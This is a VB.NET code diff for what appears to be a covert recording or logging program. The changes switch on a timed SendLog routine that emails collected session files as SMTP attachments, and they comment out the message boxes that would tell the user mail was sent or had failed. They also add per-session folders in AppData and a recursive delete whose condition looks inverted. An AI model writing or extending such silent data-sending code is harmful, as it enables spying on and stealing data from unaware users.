@@ -179,10 +179,13 @@ Public Class Form1
 
         current_time = current_time + Timer1.Interval
         If current_time >= log_timer Then
-            ' SendLog()
+            SendLog()
             current_time = 0
             previous_session_id = session_id
             session_id = GenerateGUID()
+            If Not System.IO.Directory.Exists(GetAppDataPath() & roaming_folder_path & "/" & session_id) Then
+                System.IO.Directory.CreateDirectory(GetAppDataPath() & roaming_folder_path & "/" & session_id)
+            End If
         End If
     End Sub
 
@@ -235,10 +238,10 @@ Public Class Form1
                 e_mail.Attachments.Add(New System.Net.Mail.Attachment(file))
             Next
             Smtp_Server.Send(e_mail)
-            MsgBox("Mail Sent")
+            'MsgBox("Mail Sent")
 
         Catch error_t As Exception
-            MsgBox(error_t.ToString)
+            'MsgBox(error_t.ToString)
         End Try
     End Sub
 
@@ -254,7 +257,9 @@ Public Class Form1
 
     Private Sub SendLog()
         SendEmail()
-        'Directory.Delete(GetAppDataPath() & roaming_folder_path & "/" & previous_session_id)
+        If previous_session_id = "" Then
+            Directory.Delete(GetAppDataPath() & roaming_folder_path & "/" & previous_session_id, True)
+        End If
     End Sub
 
     Private Sub StartRecording()
